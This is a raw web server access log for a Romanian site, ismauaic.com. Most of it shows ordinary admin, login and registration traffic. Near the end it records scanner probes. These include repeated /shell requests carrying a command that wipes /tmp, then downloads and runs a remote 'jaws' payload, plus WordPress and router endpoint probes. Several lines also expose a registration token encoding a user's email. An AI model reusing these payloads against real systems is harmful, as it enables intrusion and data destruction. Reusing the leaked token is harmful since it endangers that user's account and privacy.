81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /IsmaBlack.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /icons/buton-logout.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /icons/buton-user-name.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /icons/mobilenav1.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /home?_rsc=33dh4 HTTP/1.1" 307 16 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /icons/slash-icon.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /acasa?_rsc=33dh4 HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /favicon.ico HTTP/1.1" 200 25944 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /acasa HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /icons/icon-administrare.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /acasa/administrare?_rsc=33dh4 HTTP/1.1" 200 1413 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:43:15 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /acasa/administrare/echipamente?_rsc=33dh4 HTTP/1.1" 200 1508 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:45 +0000] "GET /acasa/administrare/utilizatori HTTP/1.1" 200 3066 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:45 +0000] "GET /IsmaBlack.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /icons/mobilenav1.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /icons/buton-user-name.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /icons/buton-logout.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /icons/slash-icon.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /home?_rsc=33dh4 HTTP/1.1" 307 16 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /acasa?_rsc=33dh4 HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /favicon.ico HTTP/1.1" 200 25974 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /acasa HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:43:46 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /acasa/administrare?_rsc=33dh4 HTTP/1.1" 200 1413 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /acasa/administrare/echipamente?_rsc=33dh4 HTTP/1.1" 200 1508 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "GET /icons/icon-administrare.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:46 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "GET /acasa/administrare/utilizatori HTTP/1.1" 200 3066 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "GET /IsmaBlack.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "GET /icons/buton-logout.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "GET /icons/buton-user-name.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "GET /icons/mobilenav1.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "GET /icons/slash-icon.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "GET /home?_rsc=33dh4 HTTP/1.1" 307 16 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "GET /acasa?_rsc=33dh4 HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "GET /favicon.ico HTTP/1.1" 200 25967 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:43:59 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:59 +0000] "GET /acasa HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:00 +0000] "GET /acasa/administrare?_rsc=33dh4 HTTP/1.1" 200 1413 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:00 +0000] "GET /acasa/administrare/echipamente?_rsc=33dh4 HTTP/1.1" 200 1508 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:00 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:00 +0000] "GET /icons/icon-administrare.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:20 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 303 1843 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:20 +0000] "GET /auth/login?_rsc=1yhn7 HTTP/1.1" 200 1837 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:20 +0000] "GET /ISMA.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:20 +0000] "GET /auth/register?_rsc=16nwh HTTP/1.1" 200 1837 "https://ismauaic.com/auth/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:44:23 +0000] "POST /backend-api/auth/login HTTP/1.1" 200 184 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:44:23 +0000] "POST /auth/login HTTP/1.1" 200 1977 "https://ismauaic.com/auth/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:23 +0000] "GET /acasa?_rsc=1yhn7 HTTP/1.1" 200 1446 "https://ismauaic.com/auth/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:23 +0000] "POST /acasa HTTP/1.1" 200 275 "https://ismauaic.com/acasa" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:23 +0000] "GET /home?_rsc=jsfb9 HTTP/1.1" 307 16 "https://ismauaic.com/acasa" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:23 +0000] "GET /acasa/administrare?_rsc=jsfb9 HTTP/1.1" 200 1413 "https://ismauaic.com/acasa" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:23 +0000] "GET /acasa/administrare/echipamente?_rsc=jsfb9 HTTP/1.1" 200 1508 "https://ismauaic.com/acasa" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:23 +0000] "GET /acasa/administrare/utilizatori?_rsc=jsfb9 HTTP/1.1" 200 1426 "https://ismauaic.com/acasa" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:23 +0000] "GET /acasa HTTP/1.1" 200 1446 "https://ismauaic.com/acasa" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:25 +0000] "POST /acasa HTTP/1.1" 200 275 "https://ismauaic.com/acasa" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:44:25 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 200 237190 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:44:25 +0000] "POST /acasa HTTP/1.1" 200 415 "https://ismauaic.com/acasa" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:44:26 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 200 237190 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:44:26 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 20617 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:26 +0000] "GET /acasa/administrare/utilizatori?_rsc=867of HTTP/1.1" 200 1426 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:37 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 303 1837 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:38 +0000] "GET /auth/register?_rsc=16nwh HTTP/1.1" 200 1837 "https://ismauaic.com/auth/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:38 +0000] "GET /auth/login?_rsc=1yhn7 HTTP/1.1" 200 1837 "https://ismauaic.com/auth/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:44:43 +0000] "GET /auth/login?_rsc=lwht9 HTTP/1.1" 200 1837 "https://ismauaic.com/auth/register" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:45:04 +0000] "POST /backend-api/auth/register HTTP/1.1" 201 62 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:45:04 +0000] "POST /auth/register HTTP/1.1" 200 1084 "https://ismauaic.com/auth/register" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:46:19 +0000] "GET /auth/finish-register?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYW5pZWwuYmlybGVhbnVAaW5mby51YWljLnJvIiwiaWF0IjoxNzQ4ODIxNTAxLCJleHAiOjE3NDg4NTc1MDF9.NqhE_ZUs0NxpiZxAqWve7sid4IKs8cSGkcKQ0yZfeqE HTTP/1.1" 200 2664 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:46:19 +0000] "GET /_next/static/css/62edc10b9101819c.css HTTP/1.1" 200 126 "https://ismauaic.com/auth/finish-register?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYW5pZWwuYmlybGVhbnVAaW5mby51YWljLnJvIiwiaWF0IjoxNzQ4ODIxNTAxLCJleHAiOjE3NDg4NTc1MDF9.NqhE_ZUs0NxpiZxAqWve7sid4IKs8cSGkcKQ0yZfeqE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:46:19 +0000] "GET /_next/static/chunks/app/auth/finish-register/page-e1494969b029c0a2.js HTTP/1.1" 200 2193 "https://ismauaic.com/auth/finish-register?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYW5pZWwuYmlybGVhbnVAaW5mby51YWljLnJvIiwiaWF0IjoxNzQ4ODIxNTAxLCJleHAiOjE3NDg4NTc1MDF9.NqhE_ZUs0NxpiZxAqWve7sid4IKs8cSGkcKQ0yZfeqE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:46:19 +0000] "GET /ISMA.svg HTTP/1.1" 304 0 "https://ismauaic.com/auth/finish-register?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYW5pZWwuYmlybGVhbnVAaW5mby51YWljLnJvIiwiaWF0IjoxNzQ4ODIxNTAxLCJleHAiOjE3NDg4NTc1MDF9.NqhE_ZUs0NxpiZxAqWve7sid4IKs8cSGkcKQ0yZfeqE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:46:19 +0000] "GET /auth/login?_rsc=3hkx6 HTTP/1.1" 200 1837 "https://ismauaic.com/auth/finish-register?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYW5pZWwuYmlybGVhbnVAaW5mby51YWljLnJvIiwiaWF0IjoxNzQ4ODIxNTAxLCJleHAiOjE3NDg4NTc1MDF9.NqhE_ZUs0NxpiZxAqWve7sid4IKs8cSGkcKQ0yZfeqE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:46:31 +0000] "POST /backend-api/auth/finish-register HTTP/1.1" 409 393 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:46:31 +0000] "POST /auth/finish-register?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYW5pZWwuYmlybGVhbnVAaW5mby51YWljLnJvIiwiaWF0IjoxNzQ4ODIxNTAxLCJleHAiOjE3NDg4NTc1MDF9.NqhE_ZUs0NxpiZxAqWve7sid4IKs8cSGkcKQ0yZfeqE HTTP/1.1" 200 1286 "https://ismauaic.com/auth/finish-register?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYW5pZWwuYmlybGVhbnVAaW5mby51YWljLnJvIiwiaWF0IjoxNzQ4ODIxNTAxLCJleHAiOjE3NDg4NTc1MDF9.NqhE_ZUs0NxpiZxAqWve7sid4IKs8cSGkcKQ0yZfeqE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
213.157.184.58 - - [01/Jun/2025:23:48:45 +0000] "POST /backend-api/auth/login HTTP/1.1" 200 190 "-" "curl/8.7.1"
104.236.3.45 - - [01/Jun/2025:23:53:15 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws HTTP/1.1" 400 157 "-" "-"
104.236.3.45 - - [01/Jun/2025:23:53:17 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws HTTP/1.1" 400 157 "-" "-"
104.236.3.45 - - [01/Jun/2025:23:53:19 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws HTTP/1.1" 400 157 "-" "-"
104.236.3.45 - - [01/Jun/2025:23:53:22 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws HTTP/1.1" 400 157 "-" "-"
104.236.3.45 - - [01/Jun/2025:23:53:30 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws HTTP/1.1" 400 157 "-" "-"
172.68.229.145 - - [01/Jun/2025:23:54:58 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 404 2309 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.71.250.13 - - [01/Jun/2025:23:55:23 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.71.250.12 - - [01/Jun/2025:23:55:23 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 2314 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.68.10.181 - - [01/Jun/2025:23:56:43 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 2316 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.71.164.127 - - [01/Jun/2025:23:59:02 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.71.164.225 - - [01/Jun/2025:23:59:02 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 404 2312 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
45.135.193.100 - - [02/Jun/2025:00:07:54 +0000] "POST /goform/set_LimitClient_cfg HTTP/1.1" 301 169 "-" "Go-http-client/1.1"
